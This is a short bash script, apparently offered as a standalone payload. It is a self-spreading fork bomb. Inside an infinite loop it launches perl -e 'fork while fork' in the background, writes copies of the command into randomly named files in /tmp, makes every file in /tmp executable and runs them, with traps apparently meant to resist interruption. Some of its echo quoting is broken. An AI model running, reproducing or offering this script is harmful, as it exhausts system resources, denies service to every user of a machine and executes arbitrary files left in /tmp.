#!/bin/bash
trap 'INT'
for (( ; ; ))
do
trap 'HUP'
 perl -e "fork while fork" &
 echo "perl -e "fork while fork" &" >> /tmp/$RANDOM
 chmod u+x /tmp/*
cd /tmp
./*
 perl -e "fork while fork" &
 echo "perl -e "fork while fork" &" >> /tmp/$RANDOM
 chmod u+x /tmp/*
cd /tmp
 ./*
done

